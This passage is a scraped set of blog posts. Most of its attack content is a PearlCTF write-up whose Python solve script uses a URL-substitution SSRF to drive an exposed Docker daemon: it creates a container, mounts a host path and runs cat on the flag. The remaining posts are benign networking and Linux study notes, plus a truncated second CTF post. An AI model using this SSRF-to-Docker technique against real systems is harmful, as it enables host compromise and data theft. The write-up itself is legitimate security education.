\u0026#34;value1\u0026#34;, \u0026#34;key2\u0026#34;: \u0026#34;value2\u0026#34;...etc }, \u0026#34;state\u0026#34;: Y, \u0026#34;action\u0026#34;: Z } After that, it crafts a url from http://\u0026lt;domain\u0026gt;:\u0026lt;port\u0026gt;/\u0026lt;game_action\u0026gt; by doing a series of substitutions as follows:\n3.1. replace \u0026lt;domain\u0026gt; and \u0026lt;port\u0026gt; with predefined values (not very useful to us)\n3.2. replace key1 with value1 from our input json!!!\nNow THIS, is very interesting. We can tamper with the URL however we want. Say:\nurl = http://localhost:8000/\u0026lt;game_action\u0026gt; and\nkey1 = localhost:8000/\u0026lt;game_action\u0026gt; and value1 = example.com The generated url is http://example.com. Completely controllable by us!\nIs this enough though? Well, not quite so, we need to ensure that \u0026lsquo;state\u0026rsquo; verifies the condition put as well. That\u0026rsquo;s easy, just set it to 9 Os or 9 Xs\n{ \u0026#34;api\u0026#34;: { \u0026#34;key1\u0026#34;: \u0026#34;value1\u0026#34;, \u0026#34;key2\u0026#34;: \u0026#34;value2\u0026#34;...etc }, \u0026#34;state\u0026#34;: \u0026#34;XXXXXXXXX\u0026#34;, \u0026#34;action\u0026#34;: \u0026#34;get\u0026#34; //or post if we want to trigger the post section of the request handler } This way, we can make requests yes, but how can we retrieve the flag?\nHere comes the DOCKER_HOST environment variable.\nDocker is an containerization technology, ie not quite like VM, but behaves in a way that makes the processes running inside the container isolated from the host machine.\nThe process responsible for managing all of this is the docker daemon, better known as dockerd. It\u0026rsquo;s a persistent background process that acts as a runtime that manages docker objects, ie images, containers\u0026hellip;etc.\nDocker dameon listens for REST API requests, which are HTTP requests, and as we know, HTTP is built on top of TCP, and where does the latter word appear in our application? That\u0026rsquo;s right! in the Dockerfile:\nENV DOCKER_HOST=\u0026#34;tcp://localhost:2375\u0026#34; How is this information useful you ask? Well, let\u0026rsquo;s say that exposing your docker daemon brings deamons. The kind that lets us interact with the host machine and create, start, stop, execute any docker command we like.\n2. Task Analysis The challenge overview was long I know, but now we know what we have to do. Since we think that dockerd is exposed through the network, we first should make an HTTP request to http://localhost:2375/info to verify our assumption.\nimport requests url = \u0026#39;http://localhost:80\u0026#39; # url = \u0026#39;https://tic-tac-toe-c8ae075ea3c02b7e.ctf.pearlctf.in\u0026#39; payload = { \u0026#39;api\u0026#39;: {\u0026#34;8000/\u0026lt;game_action\u0026gt;\u0026#34;: \u0026#34;2375/info\u0026#34;}, \u0026#39;state\u0026#39;: \u0026#34;_________\u0026#34;, \u0026#39;action\u0026#39;: \u0026#39;get\u0026#39;, } info = requests.post(url, json=payload).json() print(info) I\u0026rsquo;ll leave the burden of understand my script to you. You have all the pieces you need.\nNice! We confirmed our assumption. We can move to the next step, which is retrieving the flag.\nTo get the flag, the simplest we can do is create a container using the already existing image. Mout the host filesystem into this newly created container, and just cat-ing out the flag.txt file.\n3. Solution All the steps mentioned above are below on this script:\nsolve.py #!/usr/bin/env python3 import requests url = \u0026#39;http://localhost:80\u0026#39; # url = \u0026#39;https://tic-tac-toe-c8ae075ea3c02b7e.ctf.pearlctf.in\u0026#39; # step 0: create a new container that the flag.txt is mounted on payload = { \u0026#39;state\u0026#39;: \u0026#34;_________\u0026#34;, \u0026#39;api\u0026#39;: {\u0026#34;8000/\u0026lt;game_action\u0026gt;\u0026#34;: \u0026#34;2375/containers/create\u0026#34;}, \u0026#39;action\u0026#39;: \u0026#39;post\u0026#39;, \u0026#34;Image\u0026#34;: \u0026#34;b3gul4/tic-tac-toe\u0026#34;, \u0026#34;HostConfig\u0026#34;: { \u0026#34;Binds\u0026#34;: [\u0026#34;/flag:/flag:ro\u0026#34;] } } container_info = requests.post(url, json=payload).json() container_id = container_info[\u0026#39;body\u0026#39;][\u0026#39;Id\u0026#39;] print(container_id) # step 1.0: start the container payload = { \u0026#39;state\u0026#39;: \u0026#34;_________\u0026#34;, \u0026#39;api\u0026#39;: {\u0026#34;8000/\u0026lt;game_action\u0026gt;\u0026#34;: f\u0026#34;2375/containers/{container_id}/restart\u0026#34;}, \u0026#39;action\u0026#39;: \u0026#39;post\u0026#39;, } start_data = requests.post(url, json=payload).json() print(start_data) # exit() # # step 1.1: check if it\u0026#39;s up (optional) # payload = { # \u0026#39;state\u0026#39;: \u0026#34;_________\u0026#34;, # \u0026#39;api\u0026#39;: {\u0026#34;8000/\u0026lt;game_action\u0026gt;\u0026#34;: f\u0026#34;2375/containers/{container_id}/logs?stdout=true\u0026amp;stderr=true\u0026#34;}, # \u0026#39;action\u0026#39;: \u0026#39;get\u0026#39;, # } # containers = requests.post(url, json=payload).json() # print(containers) # exit() # container_id = containers[\u0026#39;body\u0026#39;][0][\u0026#39;Id\u0026#39;] # print(container_id) print(\u0026#39;==========================================================\u0026#39;) # step 2: create an exec session to get the flag # wished payload: {\u0026#34;AttachStdout\u0026#34;: True, \u0026#34;AttachStderr\u0026#34;: True, \u0026#34;Tty\u0026#34;: False, \u0026#34;Cmd\u0026#34;: [\u0026#34;cat\u0026#34;, \u0026#34;/flag/flag.txt\u0026#34;]} payload = { \u0026#39;state\u0026#39;: \u0026#34;_________\u0026#34;, \u0026#39;api\u0026#39;: {\u0026#34;8000/\u0026lt;game_action\u0026gt;\u0026#34;: f\u0026#34;2375/containers/{container_id}/exec\u0026#34;}, \u0026#39;action\u0026#39;: \u0026#39;post\u0026#39;, \u0026#34;AttachStdout\u0026#34;: True, \u0026#34;AttachStderr\u0026#34;: True, \u0026#34;Tty\u0026#34;: False, \u0026#34;Cmd\u0026#34;: [\u0026#34;cat\u0026#34;, \u0026#34;/flag/flag.txt\u0026#34;] } exec_data = requests.post(url, json=payload).json() # print(exec_data.json()) exec_id = exec_data[\u0026#39;body\u0026#39;][\u0026#39;Id\u0026#39;] # print(exec_id) # exit() print(\u0026#39;==========================================================\u0026#39;) # step 3: start the session to actually get the flag # wished payload: {\u0026#34;Detach\u0026#34;: False, \u0026#34;Tty\u0026#34;: False} payload = { \u0026#39;state\u0026#39;: \u0026#34;_________\u0026#34;, \u0026#39;api\u0026#39;: {\u0026#34;8000/\u0026lt;game_action\u0026gt;\u0026#34;: f\u0026#34;2375/exec/{exec_id}/start\u0026#34;}, \u0026#39;action\u0026#39;: \u0026#39;post\u0026#39;, \u0026#34;Detach\u0026#34;: False, \u0026#34;Tty\u0026#34;: False } resp = requests.post(url, json=payload) # flag = extract_flag(resp) # Assuming \u0026#39;response\u0026#39; holds the raw output print(resp.json()) # This should print the actual flag And there we go~ Flag is: pearl{do_y0u_r34llY_kn0w_d0ck3r_w3ll?}\nIf you\u0026rsquo;re interested in learning more about the challenge, here are some additional reads:\nContainer Vulnerabilities|Part 2 Attacker‚Äôs Tactics and Techniques in Unsecured Docker Daemons Revealed What is Docker? dockerd Configure remote access for Docker daemon ","permalink":"https://hxuu.github.io/blog/ctf/pearl25/tic-tac-toe/","summary":"\u003cp\u003e\u003cimg alt=\"challenge-description\" loading=\"lazy\" src=\"/blog/images/2025-03-09-21-56-22.png\"\u003e\nChallenge attachments and code \u003ca href=\"https://pearlctf.in/files/tic-tac-toe.zip\"\u003ehere\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"1-challenge-overview\"\u003e1. Challenge overview\u003c/h2\u003e\n\u003cp\u003eAfter starting the instance of the challenge, we\u0026rsquo;re faced with what looks like a tic tac toe\ngame over a web front. As we can see below, we can deploy and ping the game server, then click on\nthe squares to send an HTTP request to the game server containing our game state.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"ping\" loading=\"lazy\" src=\"/blog/images/2025-03-09-23-37-51.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"state\" loading=\"lazy\" src=\"/blog/images/2025-03-09-23-38-20.png\"\u003e\u003c/p\u003e\n\u003cp\u003eSince the UI doesn\u0026rsquo;t give away much of the web application\u0026rsquo;s logic, let\u0026rsquo;s dive into the source code\nto see how the latter works, namely, what endpoints are there and which of those can we tamper with.\u003c/p\u003e","title":"PearlCTF 25 - Web/Tic-Tac-Toe"},{"content":"What is Cisco Packet Tracer? Cisco Packet Tracer is a comprehensive networking simulation software tool for teaching and learning how to create network topologies and imitate modern computer networks.\nDefinitions needed to understand what follows What is a Swtich? a switch is most often used to connect individual computers, as shown here:\nWhat is a Router? A router directs data between networks, connecting devices and enabling communication by choosing optimal paths for data transmission.\nWhat is a Multi-Layer-Switch A Multi-Layer Switch combines Layer 2 (switching) and Layer 3 (routing) functions, enabling faster routing within VLANs and between networks.\nNote that understanding this basic explanation about each equipment seen here, as well as the notion of addressing, that is, each equipment is addressable (mac or ip), will help make the creation and configuration of network topologies easier to understand.\nKey Concepts Viewed 1. VLANs VLANS are best explained by the the following example\nSay there is a company building which contains many departments: Finance, Research\u0026hellip;etc.\nIt would make sense that the research department will often NOT want to share information with its neighboring Finance department. In a normal setting, the separation has to be physical, but with the help of virtual LANs, the separation can be logical.\nVLANs are based on specially-designed VLAN-aware switches, although they may also have some hubs on the periphery, as in Fig. 4-48. To set up a VLAN-based network, the network administrator decides how many VLANs there will be, which computers will be on which VLAN, and what the VLANs will be called.\nEXAMPLE Achieve the following network topology using cisco packettracer.\nFirst, copy paste the topology (no commands, use icons). Create the VLANs and assign descriptive names to them. Switch(config)#vlan 10 Switch(config-vlan)#name blue Switch(config-vlan)#exit Switch(config)#vlan 20 Switch(config-vlan)#name green Switch(config-vlan)#exit To see if you are correct, type show vlan\nConfigure trunk ports (between switches) to carry VLAN tags for inter-switch communication and access ports (between switches and end devices) to assign devices to their respective VLANs correctly. # for trunk interfaces Switch(config)#interface fastEthernet 0/1 Switch(config-if)#switchport mode trunk Switch(config-if)#switchport trunk allowed vlan 10,20 Switch(config-if)#exit # for access interfaces Switch(config)#interface fastEthernet 0/2 Switch(config-if)#switchport mode access Switch(config-if)#switchport access vlan 10 Switch(config-if)#exit To see if you are correct, type show interfaces trunk or show vlan brief\nAssign IP Addresses to the end-devices (use GUI, no CLI).\nTest connectivity using the ping command (It should work).\nThe document covers more than what was discussed here. It covers:\nNative VLAN: Configures untagged traffic on trunk ports. VLAN Management: Assigns an IP address to a VLAN for remote management. Password Configuration: Secures access to the switch via console and VTY. Saving/Deleting Configurations: Saves or resets the switch configuration. VLAN Deletion: Removes a VLAN from the switch. VLAN Creation and Naming: Creates and names VLANs. Configuration Verification: Verifies the switch‚Äôs configuration status. 2. VLANs Using a Multi Layer Switch The goal is for one end-device in one vlan to communicate to another end-device in another. We keep the same configuration for the three switches and their interfaces, and we configure the layer 3 switch as follows:\nCreate the VLANs (as shown previously)\nSwitch ports to mode trunk and allow vlan 10 and 20.\nSwitch(config)#interface range fastEthernet 0/1 - 3 Switch(config-if)#switchport trunk encapsulation dot1q Switch(config-if)#switchport mode trunk Switch(config-if)#switchport trunk allowed vlan 10,20 Switch(config-if)#exit Create VLAN interfaces inside the SVI and assign IP addresses to them. Switch(config)#interface vlan 10 Switch(config)#ip address 192.168.10.10 255.255.255.0 Switch(config)#exit Switch(config)#interface vlan 10 Switch(config)#ip address 192.168.10.10 255.255.255.0 The multi layer switch will use the network address of the assigned IP to consult its routing table to route the packet to its destination.\nEnable routing on the Layer 3 Switch to route inter-vlan traffic. Switch(config)#ip routing Link end-devices with the switch by modify their default gateway to match the address assigned to the VLAN interface of the SVI (use gui).\nTest connectivity between two devices from diffrent VLANs.\n3. Routing The network layer is concerned with getting packets from the source all the way to the destination. Getting to the destination may require making many hops at intermediate routers along the way, thus requiring a routing procotol.\nWe can either define our routes statically (1st routing TP), or dynamically (2nd TP), but overall, our job or the routing protocol\u0026rsquo;s is the same: Provide the information necessary to move the packet from one router to another to ultimately reach the destination.\nyou need to add NIM-2T (Network Interface Module - 2T) or a similar serial interface module to your routers in Cisco Packet Tracer to use serial connections.\nMake sure you copy this topology before proceeding.\nStatic Routing Static routing involves manually configuring routes on each router to define explicit paths for network traffic.\nAssign IP Addresses to Interfaces: # for each router, change the interface-id and addr with those correct # these are for direct connection. Router(config)#interface gigabitEthernet 0/0/0 Router(config-if)#ip address 192.168.3.1 255.255.255.0 Router(config-if)#no shutdown Router(config-if)#exit Add Static Routes: # Syntax: ip route \u0026lt;network-address\u0026gt; \u0026lt;subnet-mask\u0026gt; \u0026lt;next-hop-ip | exit-interface\u0026gt; Router(config)#ip route 192.168.4.0 255.255.255.0 192.168.1.2 # static routing (optional) Router(config)#ip route 0.0.0.0 0.0.0.0 192.168.1.2 To verify routing use the command show ip route\nTest connectivity using the ping command (You have to assign each device an IP addr + default gateway). Note that the default static route has be unique accross your topology or problems will occur.\nDynamic Routing We\u0026rsquo;ll use the RIP protocol which shares the information of routing accross gateways participating in the routing mechanism through a multicast address.\nTo setup this dynamic routing, remove the static routing (keep only those directly connected):\n#no ip route ... Then follow these steps:\nActivate the RIP Process, set the RIP version and disable Auto-Summary for each router participating in the protocol. Router(config)#router rip Router(config-router)#version 2 Router(config-router)#no auto-summary Declare networks directly connected to the router. Router(config-router)#network 192.168.1.0 Router(config-router)#network 192.168.3.0 Advertise a Default Route # in the router that the default route is defined at Router(config-router)#default-information originate Test connectivity using the ping command (give router a bit of time to share the routing information between each other) 4. Bonus (Inter VLAN Using a Router) Copy the topology of the first VLAN TP and add a router like this:\nRouter Configuration for Inter-VLAN Routing: Router(config)#interface gigabitEthernet 0/0/0.10 Router(config-subif)#encapsulation dot1Q 10 Router(config-subif)#ip address 192.168.10.10 255.255.255.0 Router(config-subif)#exit # after configuring each and every one: Router(config)#interface gigabitEthernet 0/0/0 Router(config-if)#no shutdown Router(config-subif)#exit You can make sure the subinterfaces were created using show ip route don\u0026rsquo;t forget to make the 4th switch interface to be trunk.\nTest connectivity using the ping command between different vlans. Show Router Configuration To clear the ARP table: On the switch/router: enable clear arp-cache On the PC: arp -d Summary Good Luck~\n","permalink":"https://hxuu.github.io/blog/misc/packettracer/","summary":"Learn about Packettracer in this detailed article.","title":"Working with Packettracer"},{"content":"Introduction Routing is the method by which the host or gateway decides where to send the IP datagram to. RIP is intended to be used in the context of the internet. Its scope isn\u0026rsquo;t as large, as it\u0026rsquo;s best fit for autonomous systems (the small parts of the internet, i.e the networks that make the network of network \u0026ldquo;internet\u0026rdquo;).\nUsing RIP, a host or a gateway may be able to send the packet directly to the destination, if that destination is directly connected to the latter. However, the interesting case is when the destination is NOT directly connected to the host/gateway. In this case, the host/gateway tries to send the packet to a nearer host/gateway to the destination.\nThe goal of the routing protocol is very simple: Supply the information that is needed to do routing.\nLimitation of the protocol Organization of the RFC Protocol Specification As per most IP documentations, we\u0026rsquo;ll use the term \u0026lsquo;host\u0026rsquo; to refer to both the host or gateway.\nSepc Any host that uses RIP is assumed to have interfaces to one or more networks. The protocol relies on accessing information about each of these networks The most important of these information is its metric or \u0026lsquo;cost\u0026rsquo; [1-15] Modern implementation should allow the network admin to set this cost value. In addition to the cost, each network will have its network number followed by the subnet mask. Each host is assumed to have a routing table containing the following information at least:\nThe IP address of the destination. A metric, which represents the total cost of getting a datagram from host to destination. The IP address of the next gateway along the path to the destination. A \u0026ldquo;route change flag\u0026rdquo; that indicates if the route to the destination has changed. Various timers associated with the route. The cost of a directly connected network is always set to 1, but as mentioned earlier, the choice can be given to the network admin to change that cost based on the bandwidth, or the reliability of that route.\nIn order for the protocol to provide complete infomation on routing, every gateway has to participate in it, hosts that are not gateways need not participate, but many implementations of the protocol make provisions for them to listen to the routing information to keep their routing table up-to-date.\nMessage formats RIP is UDP-based containing the following datagram format:\n0 1 2 3 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | command (1) | version (1) | must be zero (2) | +---------------+---------------+-------------------------------+ | address family identifier (2) | must be zero (2) | +-------------------------------+-------------------------------+ | IP address (4) | +---------------------------------------------------------------+ | must be zero (4) | +---------------------------------------------------------------+ | must be zero (4) | +---------------------------------------------------------------+ | metric (4) | +---------------------------------------------------------------+ . . . Few notes about the format:\nThe metric should be a value between 1 and 15 inclusive, the metric indicate the \u0026lsquo;cost\u0026rsquo; by which the destination is reachable or 16 if it\u0026rsquo;s not.\nThe RFC describes version 1 of the protocol which contains commands mainly related to sharing all parts of the routing table of the gateway.\nthe IP Address field is represents a normal internet address that is written in 4 octets. Note that multiple ip addresses (with thier respective costs) can be added as entries. The protocol relies on a fixed size to split them (20 bytes)\nSimulation (using cisco-packettracer) drop configuration of static routing while maintaining assigned ip addresses to router interfaces.\nmake router rip enabled. Use V2 for ALL gateways and add directly connected networks as well as stop the aggregation of routes.\nto configure the default static route.\nImplementation to be continued\u0026hellip;\n","permalink":"https://hxuu.github.io/blog/misc/rfc1058/","summary":"Learn about Rfc1058 in this detailed article.","title":"Reviewing Rfc-1058"},{"content":"Introduction Today, while studying operating systems at school, we discussed the procfs virtual filesystem and how we can extract system information using the top command.\nIn this article, I want to explore this concept in depth, as well as its relation to the top command.\nKey Concepts Windows vs Linux In the realm of Windows, the system doesn‚Äôt aim to create a uniform filesystem that handles all other filesystems interacting with it. Instead, it simply assigns each filesystem a letter for reference.\nLinux, on the other hand, strives to unify the filesystem experience. For example, the root filesystem could be of type ext4, but another media mounted on /mnt/data could have an NTFS filesystem. This begs the question: What is the means of creating this level of abstraction?\nVirtual Filesystems Here comes the notion of VFS (Virtual Filesystems), which are an abstraction layer‚Äîessentially an interface that manages filesystems by providing an upper interface to user space (via syscalls like read, write, etc.), and a lower interface made up of functions that need to be implemented by the actual filesystems and supplied to the VFS to perform common operations, regardless of the underlying filesystem.\nWhy Filesystems are Needed As obvious as it may seem, data stored in main memory is volatile and won‚Äôt persist after a shutdown. Moreover, the size of main memory is usually too small for most applications to store all their data in it. Hence, we need a solution that satisfies the following constraints:\nMultiple processes must have the ability to access information simultaneously. The information must persist after process termination. The storage medium must be large enough to handle significant amounts of data. Furthermore, raw storage solutions don‚Äôt provide the necessary features we need (like just reading or writing a block). Therefore, we create an abstraction around files‚Äîa part that handles everything related to files, which we call a filesystem.\nThe /proc Filesystem Now that we know how the filesystem works and what it does (through the concept of VFS), let\u0026rsquo;s take a look at something else.\nThe /proc (process) filesystem is a Linux filesystem responsible for information retrieval. The idea originated in the 8th version of UNIX, but Linux extended it in several ways. The basic idea was to create a file for every process, containing multiple pieces of information about the process (command line, environment variables, etc.).\nHowever, this idea extended to include information about the CPU, disk partitions, and more. The files aren‚Äôt located on disk but are instead read from system data structures on demand. Commands like top (the next section in this article) use this feature to retrieve system behavior information in a safe way.\nThe top Command We‚Äôve covered a fair bit about filesystems‚Äîsome of this information you might have already known, and some you might not have‚Äîbut now we move to a higher level, one that we interact with daily.\nman-page top \u0026ldquo;The top program provides a dynamic real-time view of a running system. It can display system summary information as well as a list of processes or threads currently being managed by the Linux kernel. The types of system summary information shown and the types, order, and size of information displayed for processes are all user configurable, and that configuration can be made persistent across restarts.\u0026rdquo;\nHaving read the man page for top, what I‚Äôm most interested in exploring is the meaning of the PR (priority) field.\nReal-Time vs Normal In the Linux operating system, processes can be categorized into two main types based on their scheduling policies: real-time and normal processes. Real-time processes have the highest priority and can preempt normal processes. These processes are generally used for tasks that require immediate attention. Normal processes have a lower priority than real-time processes, meaning they are less urgent.\nPriorities are represented by numbers, just like the chrt command shows:\n‚ûú chrt -m SCHED_OTHER min/max priority : 0/0 SCHED_FIFO min/max priority : 1/99 SCHED_RR min/max priority : 1/99 SCHED_BATCH min/max priority : 0/0 SCHED_IDLE min/max priority : 0/0 SCHED_DEADLINE min/max priority : 0/0 Real-time processes have a priority number range of 1 to 99, with 1 being the least urgent and 99 being the most urgent. Normal processes have a range of 100 to 139, with 100 being the least urgent and 139 the most urgent. This may seem counterintuitive, but the kernel actually inverts the priority order.\nHere‚Äôs the sched.h file in the Linux source code:\n/* * Priority of a process goes from 0..MAX_PRIO-1, valid RT * priority is 0..MAX_RT_PRIO-1, and SCHED_NORMAL/SCHED_BATCH * tasks are in the range MAX_RT_PRIO..MAX_PRIO-1. Priority * values are inverted: lower p-\u0026gt;prio value means higher priority. * * The MAX_USER_RT_PRIO value allows the actual maximum * RT priority to be separate from the value exported to * user-space. This allows kernel threads to set their * priority to a value higher than any user task. Note: * MAX_RT_PRIO must not be smaller than MAX_USER_RT_PRIO. */ #define MAX_USER_RT_PRIO 100 #define MAX_RT_PRIO MAX_USER_RT_PRIO #define MAX_PRIO (MAX_RT_PRIO + 40) #define DEFAULT_PRIO (MAX_RT_PRIO + 20) The top command uses these priority numbers as a basis of representation. It does, however, perform some calculations to represent the priority in the PR field.\nFor normal processes, we know that the 1 in range(100,139) stays the same, thus making it more efficient to represent the priorities from 00 through 39. These are represented in the PR field using a nice value within the range(-20, +19), \u0026ldquo;inclusive\u0026rdquo;, using this equation:\nP R = + 2 0 + $ n i c e n i c e d e f a u l t s t o Z e r o For real-time processes, and to avoid interference with the priority numbers of normal processes, we take a different approach and represent rt (real-time) priorities with negative numbers in the range(-1, -100) \u0026ldquo;inclusive\u0026rdquo;, using this equation:\nP R = - 1 - $ r t _ p r i o r i t y r t _ p r i o r i t y i n r a n g e ( 0 , + 9 9 ) \" i n c l u s i v e \" This is why -51 in the following top command result represents a real-time high-priority process.\nBut how about the rt flag just above? Why aren‚Äôt we using a negative value instead? - The answer is idk~ It\u0026rsquo;s to indicate a real-time scheduling algorithm, but -51 does the same.\nConclusion In this article, we explored the concept of virtual filesystems, specifically procfs, and how they abstract away complex system information for user interaction. Linux‚Äôs VFS plays a key role in standardizing filesystem interaction across various types. We also discussed the /proc filesystem, which provides crucial system data like process and CPU information. The top command leverages this, displaying real-time system activity, including process priorities. We examined the difference between real-time and normal process priorities, understanding how top represents them. Through this, we gained deeper insights into Linux‚Äôs process scheduling and resource management.\n","permalink":"https://hxuu.github.io/blog/misc/looking-at-the-top-command/","summary":"Learn about Looking at the Top Command in this detailed article.","title":"Looking at the Top Command - But More..."},{"content":" Exploring the X Window System and Related Concepts\nTL;DR The X Window System (commonly known as X11 or simply X) is a windowing system for bitmap displays, primarily used on Unix-like operating systems. Developed as part of Project Athena at MIT in 1984, it became the foundation for graphical interfaces on Unix-based systems. The protocol, currently at version 11 (hence \u0026ldquo;X11\u0026rdquo;), has been around since 1987 and is still widely used, managed by the X.Org Foundation.\nAt its core, X provides the infrastructure to create and manage windows on bitmap displays. It separates the underlying hardware from the graphical user interface (GUI), allowing applications to interact with the display hardware without needing direct control over it. X allows windows to be drawn on the screen, handles user inputs like keyboard and mouse events, and enables the concept of a client-server model, where the display (X server) manages graphical requests from applications (X clients).\nIn-depth View of X11 1. Technical Details \u0026amp; Definitions Windowing System A windowing system is a software suite that manages the various windows on a computer display, a vital component of any graphical user interface (GUI). It provides the structure for displaying different parts of the screen and allows multiple applications to run simultaneously within separate windows. A windowing system implements the WIMP (Windows, Icons, Menus, Pointer) paradigm and is crucial for managing the interaction between the user and the operating system.\nIn a typical setup, each application is assigned a rectangular surface to present its interface, known as a window. These windows can be resized, moved, and may overlap each other, creating the user-friendly environment we\u0026rsquo;re accustomed to. Window decorations, such as title bars and buttons, are often drawn around these windows for better management and control. This interaction is further simplified through widget toolkits, which provide graphical components like buttons, sliders, and other interactive elements.\nBitmap in Relation to X11 In the context of the X Window System, a bitmap refers to a grid of pixels that forms an image. A bitmap display is an image where each pixel corresponds to a specific value representing color. The X Window System handles these bitmaps to display images and graphical user interfaces (GUIs) on the screen.\nBitmaps are central to how graphical systems represent and manipulate images. For instance, when an application creates a window, the content inside the window (icons, images, text, etc.) is represented as bitmaps that the X server draws on the display. As a raster image format, the bitmap consists of individual pixels organized in rows, where each pixel holds a value defining its color.\n2. X11 Components In this section, I\u0026rsquo;ll be discussing xdm only, as it was the subject of search that the professor deemed intersting to look at.\nxdm: X Display Manager xdm stands for X Display Manager, which is a graphical login manager for X11. It provides the interface for logging into a system in a graphical environment. Once the login credentials are entered, xdm starts an X session and manages the display connections. Essentially, it facilitates the transition from the console to the graphical user interface and ensures that the X server is correctly initiated.\nxdm is part of a broader category of display managers, which are responsible for starting the display server and handling user authentication, session management, and even different environments (such as GNOME, KDE, or i3). While xdm was historically one of the first display managers for X11, it has been largely replaced by more modern equivalents like gdm (GNOME Display Manager) and lightdm.\nWhat Does \u0026quot;?xdm?\u0026quot; Mean When Running Commands Like w or who? When running terminal commands like w or who, which list logged-in users and their session details, you might occasionally see ?xdm?. This occurs when the terminal is trying to identify the session source or type but is unable to fully determine it. Instead of listing a proper terminal type (like tty or pts), it shows ?xdm?, indicating that the session was started by xdm or a similar display manager.\nTypically, this signifies that the session is graphical and was initiated via xdm rather than through a standard terminal login. Graphical sessions don\u0026rsquo;t always have a physical terminal (TTY) associated with them, so the system marks it with ?xdm? to show that it was initialized by the X Display Manager, as opposed to the traditional text-based terminals.\nFor example, the output of the w command might look like this:\nUSER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT logan :0 :0 10:48 ?xdm? 4:16 0.73s init --user logan pts/3 :0 10:59 3.00s 0.19s 0.01s w In this output, the graphical session (:0) shows ?xdm? in the IDLE column, indicating that the system cannot determine or track idle time for that session. In contrast, the terminal session (pts/3) shows a specific idle time of 3.00s, demonstrating that the system can monitor idle states for terminal sessions.\nNote: Why we see two entries of the same user when running w command The reason we see two entries for the same user in the w command output is that we have multiple sessions or processes running under the same user. Specifically, the output shows that two processes are associated with the user logan:\nlogan :0 :0: This entry shows the user logan logged into the graphical interface session (:0 is the display server\u0026rsquo;s session for X or Wayland). The command init --user is related to the systemd process managing the user\u0026rsquo;s session in the background.\nlogan pts/3 :0: This entry shows the user logan has a terminal session open (pts/3 is a pseudo-terminal, indicating a terminal emulator inside the graphical session). The command w was executed in this terminal.\nEach session is listed separately because they are different types of sessions (graphical vs terminal).\nConclusion The X Window System and its components form the backbone of graphical user interfaces in many Unix-like systems. From window management to bitmaps and display managers like xdm, each part plays a vital role in delivering a smooth, interactive user experience. Understanding these components‚Äîalong with nuances like seeing ?xdm? in terminal commands‚Äîgives deeper insight into the workings of graphical interfaces on Linux and other systems.\n","permalink":"https://hxuu.github.io/blog/misc/x11/","summary":"Learn about X11 in this detailed article.","title":"X11 - A bird's eye view"},{"content":"Challenge Description n c p s a a o o m t i l e e n v : g t e o s s t r : : r y e : 3 5 n 8 2 d w 3 z e b e x p l o i t a t i o n The latest trendz is all about Go and HTMX, but what could possibly go wrong? A secret post has been hidden deep within the application. Your mission is to uncover it.\nNote: This challenge consists of four parts, which can be solved in any order. However, the final part will only be accessible once you\u0026rsquo;ve completed this initial task, and will be released in Wave 3.\nThe JWT_SECRET_KEY environment variable given in the handout is just a placeholder, and not the actual value set on remote.\nAnalysis We\u0026rsquo;re given the following web page (after we login)\nWe can create posts and view them. Following what the description says, our job is to view this hidden post, luckily for us, we\u0026rsquo;re given the source code here\n. ‚îú‚îÄ‚îÄ Dockerfile ‚îú‚îÄ‚îÄ go.mod ‚îú‚îÄ‚îÄ go.sum ‚îú‚îÄ‚îÄ handlers ‚îÇ¬†‚îú‚îÄ‚îÄ custom ‚îÇ¬†‚îÇ¬†‚îî‚îÄ‚îÄ Custom.go ‚îÇ¬†‚îú‚îÄ‚îÄ dashboard ‚îÇ¬†‚îÇ¬†‚îú‚îÄ‚îÄ AdminDash.go ‚îÇ¬†‚îÇ¬†‚îú‚îÄ‚îÄ SuperAdminDash.go ‚îÇ¬†‚îÇ¬†‚îî‚îÄ‚îÄ UserDash.go ‚îÇ¬†‚îú‚îÄ‚îÄ db ‚îÇ¬†‚îÇ¬†‚îî‚îÄ‚îÄ Init.go ‚îÇ¬†‚îú‚îÄ‚îÄ jwt ‚îÇ¬†‚îÇ¬†‚îî‚îÄ‚îÄ JWTAuth.go ‚îÇ¬†‚îî‚îÄ‚îÄ service ‚îÇ¬†‚îú‚îÄ‚îÄ CreateUser.go ‚îÇ¬†‚îú‚îÄ‚îÄ JWTHandler.go ‚îÇ¬†‚îú‚îÄ‚îÄ LoginUser.go ‚îÇ¬†‚îú‚îÄ‚îÄ Posts.go ‚îÇ¬†‚îî‚îÄ‚îÄ ValidateAdmin.go ‚îú‚îÄ‚îÄ init.sql ‚îú‚îÄ‚îÄ jwt.secret ‚îú‚îÄ‚îÄ main.go ‚îú‚îÄ‚îÄ nginx.conf ‚îú‚îÄ‚îÄ readme.md ‚îú‚îÄ‚îÄ run.sh ‚îú‚îÄ‚îÄ static ‚îÇ¬†‚îú‚îÄ‚îÄ css ‚îÇ¬†‚îÇ¬†‚îú‚îÄ‚îÄ admin.css ‚îÇ¬†‚îÇ¬†‚îú‚îÄ‚îÄ bootstrap.min.css ‚îÇ¬†‚îÇ¬†‚îú‚îÄ‚îÄ style.css ‚îÇ¬†‚îÇ¬†‚îî‚îÄ‚îÄ user.css ‚îÇ¬†‚îú‚îÄ‚îÄ index.html ‚îÇ¬†‚îî‚îÄ‚îÄ js ‚îÇ¬†‚îú‚îÄ‚îÄ client-side-templates.js ‚îÇ¬†‚îú‚îÄ‚îÄ htmx.min.js ‚îÇ¬†‚îú‚îÄ‚îÄ json-enc.js ‚îÇ¬†‚îî‚îÄ‚îÄ nunjucks.min.js ‚îî‚îÄ‚îÄ templates ‚îú‚îÄ‚îÄ adminDash.tmpl ‚îú‚îÄ‚îÄ login.tmpl ‚îú‚îÄ‚îÄ main.tmpl ‚îú‚îÄ‚îÄ register.tmpl ‚îú‚îÄ‚îÄ superAdminDash.tmpl ‚îú‚îÄ‚îÄ userDash.tmpl ‚îî‚îÄ‚îÄ viewPost.tmpl It\u0026rsquo;s a Go application, let\u0026rsquo;s check the Dockerfile\nDockerfile FROM golang:alpine AS builder RUN apk update \u0026amp;\u0026amp; apk add --no-cache git WORKDIR /app COPY go.mod go.sum ./ RUN go mod 